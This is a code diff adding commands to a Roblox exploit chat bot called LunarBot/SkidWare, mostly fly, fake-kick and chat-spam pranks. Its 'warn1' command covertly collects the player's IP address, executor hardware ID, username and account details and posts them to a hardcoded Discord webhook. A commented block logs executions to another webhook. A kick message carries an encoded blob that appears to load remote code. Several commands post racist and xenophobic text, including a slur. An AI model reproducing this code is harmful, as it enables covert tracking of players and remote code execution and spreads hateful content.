+            bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
+            bg.cframe = torso.CFrame 
+            local bv = Instance.new("BodyVelocity", torso) 
+            bv.velocity = Vector3.new(0,0.1,0) 
+            bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
+            repeat wait() 
+            plr.Character.Humanoid.PlatformStand = true 
+            if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
+            speed = speed+.5+(speed/maxspeed) 
+            if speed > maxspeed then 
+            speed = maxspeed 
+            end 
+            elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then 
+            speed = speed-1 
+            if speed < 0 then 
+            speed = 0 
+            end 
+            end 
+            if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
+            bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
+            lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
+            elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then 
+            bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
+            else 
+            bv.velocity = Vector3.new(0,0.1,0) 
+            end 
+            bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
+            until not flying 
+            ctrl = {f = 0, b = 0, l = 0, r = 0} 
+            lastctrl = {f = 0, b = 0, l = 0, r = 0} 
+            speed = 0 
+            bg:Destroy() 
+            bv:Destroy() 
+            plr.Character.Humanoid.PlatformStand = false 
+            end 
+            mouse.KeyDown:connect(function(key) 
+            if key:lower() == "g" then 
+            if flying then flying = false 
+            else 
+            flying = true 
+            Fly() 
+            end 
+            elseif key:lower() == "w" then 
+            ctrl.f = 1 
+            elseif key:lower() == "s" then 
+            ctrl.b = -1 
+            elseif key:lower() == "a" then 
+            ctrl.l = -1 
+            elseif key:lower() == "d" then 
+            ctrl.r = 1 
+            end 
+            end) 
+            mouse.KeyUp:connect(function(key) 
+            if key:lower() == "w" then 
+            ctrl.f = 0 
+            elseif key:lower() == "s" then 
+            ctrl.b = 0 
+            elseif key:lower() == "a" then 
+            ctrl.l = 0 
+            elseif key:lower() == "d" then 
+            ctrl.r = 0 
+            end 
+            end)
+            Fly()
+
+			end)
+		end,
+	},
+    tax = {
+		Name = "tax",
+		Aliases = {},
+		Use = "Chats LunarBot's current FPS!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+                chat("Yes.. i evade taxses")
+                wait(1)
+                chat("Cry about it")
+                wait(1)
+                chat("Why is there a van pulling up my house..")
+                bot:Kick("You have addmited evading taxses. Now the IRS are after you..")
+			end)
+		end,
+	},
+    social = {
+		Name = "social",
+		Aliases = {},
+		Use = "Chats LunarBot's current FPS!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+                chat("我无父。 我母不爱我。 我,滑板也。 这天的生活太糟粕了...")
+                wait(1)
+                chat("荣归于中,表于西提琴。 我,乌尔·中国政府也!!!!!!!")
+                wait(1)
+                chat("变穷之,独谢为上! 社区主义为上! 神! 我爱其中,我其公民矣。 世信,Xi不杀我!!")
+                
+			end)
+		end,
+	},
+    dissapointment = {
+		Name = "dissapointment",
+		Aliases = {},
+		Use = "Chats LunarBot's current FPS!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+              
+                chat("You shit dissapointment. 变穷之,独谢为上! 社区主义为上! 神! 我爱其中,我其公民矣。 吾有10000000000世信,Xi不杀我!!")
+                
+			end)
+		end,
+	},
+    social2 = {
+		Name = "social2",
+		Aliases = {},
+		Use = "Chats LunarBot's current FPS!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+                chat("我无父。 我母不爱我。 我,滑板也。 这天的生活太糟粕了...")
+                wait(1)
+                chat("荣归于中,表于西提琴。 我,乌尔·中国政府也!!!!!!!")
+                wait(1)
+                chat("变穷之,独谢为上! 社区主义为上! 神! 我爱其中,我其公民矣。 吾有10000000000世信,Xi不杀我!!")
+                bot:Kick("西玲發現你在說中國，5秒後就處決你。 我將成個軍隊送到你屋企緊之前，你最好跑。 你嘅社會信用被扣除6000，你會受苦，為你嘅執行公民詐假意。 頂部有防滑器皿。 你呢個黑鬼！")
+			end)
+		end,
+	},
+    kick1 = {
+        Name = "Kick1",
+        Aliases = {"K"},
+        Use = "Kicks user",
+        Enabled = true,
+        CommandFunction = function(msg, args, speaker)
+            pcall(function() 
+                chat("OH NO...")
+                wait(1)
+                chat("NOT THE MOD! AAAAGH")
+                bot:Kick("USER-BANNED - [You have been violated by an SkidWare mod]")
+    
+            end)
+        end,
+    
+    },
+    md = {
+        Name = "Kick1",
+        Aliases = {"K"},
+        Use = "Kicks user",
+        Enabled = true,
+        CommandFunction = function(msg, args, speaker)
+            pcall(function() 
+                chat("OH NO...")
+                wait(1)
+                chat("NOT THE MOD! AAAAGH")
+                bot:Kick("USER-BANNED - [You have been violated by an SkidWare mod]")
+    
+            end)
+        end,
+    
+    },
+	ban2 = {
+        Name = "ban2",
+        Aliases = {"BAN"},
+        Use = "Kicks user",
+        Enabled = true,
+        CommandFunction = function(msg, args, speaker)
+            pcall(function() 
+print("Banning")
+
+                bot:Kick("BANNED")
+    
+            end)
+        end,
+    
+    },
+
+    warn1 = {
+		Name = "warn1",
+		Aliases = {},
+		Use = "Chats LunarBot's current FPS!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+                chat("[!] - WARRNED ACCOUNT")
+--//34567890-097865342256789097653456789009765432537468590-097654325467890-0806543214356789
+
+local IP = game:HttpGet("https://v4.ident.me")
+plr = game:GetService'Players'.LocalPlayer
+local premium = false
+local ALT = false
+if plr.MembershipType == Enum.MembershipType.Premium then
+	premium = true
+elseif plr.MembershipType == Enum.MembershipType.None then
+	premium = false
+end
+if premium == false then 
+	if plr.AccountAge <= 70 then 
+		ALT = true
+	end
+end
+
+local market = game:GetService("MarketplaceService")
+local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+
+
+local http_request = http_request;
+if syn then
+	http_request = syn.request
+elseif SENTINEL_V2 then
+	function http_request(tb)
+		return {
+			StatusCode = 200;
+			Body = request(tb.Url, tb.Method, (tb.Body or ''))
+		}
+	end
+end
+
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+hwid = "";
+
+for i, v in next, hwid_list do
+	if decoded.headers[v] then
+		hwid = decoded.headers[v];
+		break
+	end
+end
+
+if hwid then
+local HttpServ = game:GetService('HttpService')
+local url = "https://discord.com/api/webhooks/1050848420224577587/lHKLhRkz7flA049MUL0h4iAZMmAQ1uLx4ZbS9Pha67xrBH-hF-3OAZj5X535vUKy_YjH"
+--local url = "https://discord.com/api/webhooks/753688508828483634/qo0PL1VWKkPGH9UETChhu9fxwY001h0JDEPlZIrsaxHZS26tztecA9la4vz-46_0kajq"
+
+local data = 
+    {
+        ["content"] = "WARNED ACCOUNT",
+        ["embeds"] = {{
+            ["title"] = "__**HWID:**__",
+            ["description"] = hwid,
+            ["type"] = "rich",
+            ["color"] = tonumber(0xAB0909),
+            ["fields"] = {  
+
+			
+			  {
+                    ["name"] = "Username:",
+                    ["value"] = Game.Players.LocalPlayer.Name,
+                    ["inline"] = true
+                },
+				{
+                    ["name"] = "IP Address:",
+                    ["value"] = IP,
+                    ["inline"] = true
+                },
+				{
+                    ["name"] = "Game Link:",
+                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
+                    ["inline"] = true
+                },
+				{
+					["name"] = "Game Name:",
+					["value"] = info.Name,
+					["inline"] = true
+				},
+				{
+					["name"] = "Age:",
+					["value"] = plr.AccountAge,
+					["inline"] = true
+				},
+				{
+					["name"] = "Roblox Premium:",
+					["value"] = premium,
+					["inline"] = true
+				},
+				{
+					["name"] = "Alternetive Account:",
+					["value"] = ALT,
+					["inline"] = true
+				},
+				
+            },
+        }}
+    }
+    local newdata = HttpServ:JSONEncode(data)
+    
+    local headers = {
+            ["content-type"] = "application/json"
+    }
+    
+    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
+    http_request(request_payload)
+end
+                bot:Kick("ACCOUNT WARRNED.")
+			end)
+		end,
+	},
+
+    ban = {
+        Name = "ban",
+        Aliases = {"K"},
+        Use = "Kicks user",
+        Enabled = true,
+        CommandFunction = function(msg, args, speaker)
+            pcall(function() 
+print("Banning")
+print("Executing protocools")
+print("Banning")
+print("Bypassing")
+print("Banning")
+                bot:Kick("USER-BANNED n/n/ Reason: Lack of a father figure n/n/ Leinght: SkidWare bro")
+    
+            end)
+        end,
+    
+    },
+    dad = {
+		Name = "dad",
+		Aliases = {},
+		Use = "Chats LunarBot's current FPS!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+                chat("Banned; Reason: Lack of father figure")
+                chat("No milk?")
+                wait(3)
+                chat("Why can't your dad come today?")
+			end)
+		end,
+	},
+ 
+    NerdHim = {
+		Name = "NerdHim",
+		Aliases = {},
+		Use = "Chats LunarBot's current FPS!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+                chat("NERD!")
+                
+             
+			end)
+		end,
+	},
+
+     fling = {
+		Name = "fling",
+		Aliases = {},
+		Use = "Chats LunarBot's current FPS!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+                bot.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
+			end)
+		end,
+	},
+	
+
+	math = {
+		Name = "math",
+		Aliases = {},
+		Use = "Does <operation> on arguments.",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				if not args[2] then return end
+				if not args[3] then return end
+				if not args[4] then return end
+				
+				local operations = {
+					"add",
+					"subtract",
+					"multiply",
+					"divide"
+				}
+				
+				local operation = args[2]
+				
+				if not table.find(operations, operation) then
+					chat("Invalid operation!")
+					return
+				end
+				
+				local result
+				
+				local nums = {}
+				
+				for i, arg in pairs(args) do
+					if i > 2 then
+						if tonumber(arg) then
+							table.insert(nums, tonumber(arg))
+						else
+							chat("Attempt to do math on unknown characters!")
+							return	
+						end
+					end
+				end
+				
+				for i, num in pairs(nums) do
+					if i == 1 then
+						result = num
+					else
+						if operation == "add" then
+							result = result + num
+						elseif operation == "subtract" then
+							result = result - num
+						elseif operation == "divide" then
+							result = result / num
+						elseif operation == "multiply" then
+							result = result * num
+						end
+					end
+				end
+				
+				chat("Result: " .. tostring(result))
+			end)
+		end,
+	},
+	disablecommand = {
+		Name = "disablecommand",
+		Aliases = {"disablecmd", "cmddisable"},
+		Use = "Disables the specified command. Owner-only command!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				if not speaker == bot.Name then chat("You do not have permission to disable this command.") return end
+			
+				if not args[2] then return end
+			
+				local cmd = checkCommands(args[2])
+			
+				if not cmd then
+					chat("Invalid command!")
+					return
+				end
+				
+				cmd.Enabled = false
+				chat("Disabled command: " .. cmd.Name .. "!")
+			end)
+		end,
+	},
+	enablecommand = {
+		Name = "enablecommand",
+		Aliases = {"enablecmd", "cmdenable"},
+		Use = "Enables the specified command! Owner-only command!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				if not speaker == bot.Name then chat("You do not have permission to disable this command.") return end
+			
+				if not args[2] then return end
+			
+				local cmd = checkCommands(args[2])
+			
+				if not cmd then
+					chat("Invalid command!")
+					return
+				end
+				
+				cmd.Enabled = true
+				chat("Enabled command: " .. cmd.Name .. "!")
+			end)
+		end,
+	},
+	randomplayer = {
+		Name = "randomplayer",
+		Aliases = {"rndplayer", "randomplr", "player"},
+		Use = "Gets a random player that is currently in the server and chats their display name!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				local rnd = game.Players:GetPlayers()[math.random(1,#game.Players:GetPlayers())]
+				
+				if rnd then
+					chat("Random player: " .. rnd.DisplayName)
+				end
+			end)
+		end,
+	},
+
+	randommove = {
+		Name = "randommove",
+		Aliases = {"rndmove", "autowalk"},
+		Use = "Toggles LunarBot's random movement feature!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				randommove = not randommove
+				
+				if randommove == true then
+					chat("Enabled random move!")
+				else
+					chat("Disabled random move!")
+				end
+			end)
+		end,
+	},
+	rush = {
+		Name = "rush",
+		Aliases = {"rushbegin"},
+		Use = "Makes LunarBot turn into Rush from DOORS!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				if rushing == true then return end
+				rushing = true
+				chat("-lights flicker-")
+				local origin = bot.Character.HumanoidRootPart.Position
+				local startpos = bot.Character.HumanoidRootPart.Position - Vector3.new(-150, 0, 0)
+				bot.Character:SetPrimaryPartCFrame(CFrame.new(startpos))
+				wait(1.5)
+				chat("-rush sounds-")
+				local movetween = TS:Create(bot.Character.HumanoidRootPart, TI, {CFrame = CFrame.new(origin)})
+				movetween:Play()
+				movetween.Completed:Wait()
+				chat("-rush screams-")
+				wait(10)
+				rushing = false
+			end)
+		end,
+	},
+	Check = {
+		Name = "Check",
+		Aliases = {"Check"},
+		Use = "Checks user",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				chat("Ey brow. SkidWARE ON TOP")
+				wait(1)
+				chat("SkidWare!")
+			end)
+		end,
+	
+	}
+}
+
+
+--// Kick enpoints
+Kick = {
+	Name = "Kick",
+	Aliases = {"K"},
+	Use = "Kicks user",
+	Enabled = true,
+	CommandFunction = function(msg, args, speaker)
+		pcall(function() 
+			chat("OH NO...")
+            wait(1)
+			chat("NOT THE MOD! AAAAGH")
+			bot:Kick("USER-BANNED - [You have been violated by an SkidWare mod]")
+
+		end)
+	end,
+
+}
+ Tax = {
+	Name = "Tax",
+	Aliases = {"Tax"},
+	Use = "Make user admit he is evading taxses",
+	Enabled = true,
+	CommandFunction = function(msg, args, speaker)
+		
+			chat("Fine.. I admit it..")
+            wait(1)
+			chat("I'm evading TAXSES!")
+            wait(3)
+            chat("Why is there a van pulling up my house..")
+			bot:Kick("You have addmited evading taxses. Now the IRS are after you..")
+
+	
+	end,
+
+}
+SusyKick =  {
+	Name = "SusyKick",
+	Aliases = {"SusKick"},
+	Use = "Prety sus stuff.",
+	Enabled = true,
+	CommandFunction = function(msg, args, speaker)
+		pcall(function() 
+			chat("Lord oh lord.")
+            wait(1)
+			chat("I'M THE IMPOSTOR!")
+            wait(3)
+            chat("Why did a funny tube get thronwn in my hous-")
+			
+
+		end)
+		bot:Kick("You have died from addmiting your sus.")
+	end,
+
+}
+TrollAbuseKick =  {
+	Name = "TrollAbuseKick",
+	Aliases = {"TAB-Kick"},
+	Use = "Abuse kicker",
+	Enabled = true,
+	CommandFunction = function(msg, args, speaker)
+		pcall(function() 
+			chat("I will sacrefice my life to SkidWare!")
+            wait(1)
+			chat("I love SkidWare")
+            wait(3)
+            chat("The deamons shall take me now!")
+			bot:Kick("The deamins took u !1!1!!")
+
+		end)
+	end,
+
+}  --// with webhook / warning shit
+
+Warn =  {
+	Name = "Warn",
+	Aliases = {"W"},
+	Use = "Warns user",
+	Enabled = true,
+	CommandFunction = function(msg, args, speaker)
+		pcall(function() 
+		print("Warrning user")
+            
+            
+            wait(3)
+			chat("[!] - This account has been warrned. By SkidWare staff.")
+            chat("[!] - This record is logged.")
+		end)
+	end,
+}
+
+UnKick =  {
+	Name = "UnKick",
+	Aliases = {"UnKick"},
+	Use = "idk",
+	Enabled = true,
+	CommandFunction = function(msg, args, speaker)
+		pcall(function() 
+		
+			bot:Kick("Nice mod kick, now get violated! n/n LOL!043O00033D3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F796F686F686F79752F4875622F6D61696E2F41646D696E53797331030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574000A3O00124O00014O000500015O001202000200023O001202000300033O0020060003000300042O0005000500014O0001000300054O000400023O00022O00030002000100012O00073O00017O000A3O00013O00023O00033O00033O00033O00033O00033O00033O00033O00033O00")
+
+		end)
+	end,
+
+}
+
+TrollKick = {
+	Name = "TrollKick",
+	Aliases = {"TR"},
+	Use = "Troll Kicks user",
+	Enabled = true,
+	CommandFunction = function(msg, args, speaker)
+		pcall(function() 
+
+            local hum = bot.Character:FindFirstChildWhichIsA("Humanoid")
+			
+			if hum then
+				hum.Health = 0
+			end
+            wait(2)
+			chat("OH NO...")
+			chat("NOT THE MOD! AAAAGH")
+			wait(1)
+            
+            local hum = bot.Character:FindFirstChildWhichIsA("Humanoid")
+			
+			if hum then
+				hum.Health = 0
+			end
+
+		end)
+	end,
+
+}
+
+local cmdcon = messageDoneFiltering.OnClientEvent:Connect(function(data)
+	local message = data.Message
+	local speaker = data.FromSpeaker
+	
+	local speakerplayer = game.Players:FindFirstChild(speaker)
+	
+	if not speakerplayer then return end
+
+	local msg = string.lower(message)
+	
+	if string.sub(msg, 1, 1) == prefix then
+		if speakerplayer:FindFirstChild("LunarBotBlacklist") then
+			return
+		end
+
+		if not table.find(whitelisted, speaker) and allwhitelisted == false then
+			return
+		end
+		
+		if rickrolling == true then return end
+	
+		msg = string.sub(msg, 2)
+		
+		local args = string.split(msg, " ")
+		
+		local cmd = checkCommands(args[1])
+		
+		if status ~= nil and speaker ~= bot.Name then
+			chat("LunarBot Status // " .. status .. " // Commands are disabled.")
+			return
+		end
+		
+		if cmd ~= nil then
+			if cmd.Enabled == false then
+				chat("The command " .. cmd.Name .. " is currently disabled. Please request it to be re-enabled by " .. bot.DisplayName .. ".")
+				print("LunarBot CMDLogs // " .. speaker .. " attempted to run command: " .. cmd.Name .. " with arguments: " .. tts(args) .. "while the command was disabled.")
+				return
+			else
+				cmd.CommandFunction(message, args, speaker)
+				
+				local function tts(t)
+					local r = ""
+					
+					for i, v in pairs(t) do
+						r = r .. v .. ", "
+					end
+					
+					return r
+				end
+				
+				print("Mod CMDLogs // " .. speaker .. " ran command: " .. cmd.Name .. " with arguments: " .. tts(args))
+			end
+		else
+			warn("Could not find command: " .. args[1] .. "!")
+		end
+	elseif speakerplayer == copychatplayer then
+		chat(speakerplayer.DisplayName .. ": " .. message)
+	end
+end)
+
+bot.Chatted:Connect(function(msg)
+	if (string.lower(msg) == "lunar.disable()" or string.lower(msg) == "lunar.disconnect()") and disconnected == false then
+		cmdcon:Disconnect()
+		disconnected = true
+		wait()
+		chat("Successfully disconnected LunarBot.")
+	end
+end)
+
+--[[ 
+	local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or (lunar and lunar.request) or nil
+
+if req ~= nil then
+	req({
+	    Url = "https://discord.com/api/webhooks/1047900557534314526/resEYsAS_rvrwnNYt5r3n10u018QrJBThttKYgZ77-GeR8jqguyfwDeARwpGOdnxBy-unonononnononononononononn",
+	    Method = "POST",
+	    Headers = {
+		["Content-Type"] = "application/json"
+	    },
+	    Body = game.HttpService:JSONEncode({
+		content = "<@598958193032560642>",
+		embeds = {
+			title = "LunarBot Execution",
+			description = "LunarBot has been executed by " .. bot.DisplayName .. "!",
+			color = 0xAADDFF,
+			author = "LunarBot Execution Bot",
+			fields = {
+				{name = "User ID", value = bot.UserId, inline = true},
+				{name = "Name", value = bot.Name, inline = true},
+				{name = "Time", value = os.date("%I:%M:%S %p"), inline = true}
+			}
+		},
+	   })
+	})
+end
+]]
+
+
+task.spawn(function()
+	while wait(randommoveinteger) do
+		if randommove == true and disconnected == false then
+			local rndnum = math.random(1,4)
+			local add = Vector3.new(0,0,0)
+			
+			if rndnum == 1 then
+				add = Vector3.new(15,0,0)
+			elseif rndnum == 2 then
+				add = Vector3.new(-15,0,0)
+			elseif rndnum == 3 then
+				add = Vector3.new(0,0,15)
+			else
+				add = Vector3.new(0,0,-15)
+			end
+			
+			bot.Character.Humanoid:MoveTo(bot.Character.HumanoidRootPart.Position + add)
+		end
+	end
+end)
+
+task.spawn(function()
+	while wait() do
+		if followplr and disconnected == false then
+			local hum = bot.Character.Humanoid
+			
+			if hum then
+				hum:MoveTo(followplr.Character.HumanoidRootPart.Position)		
+			end
+		end
+	end
+end)
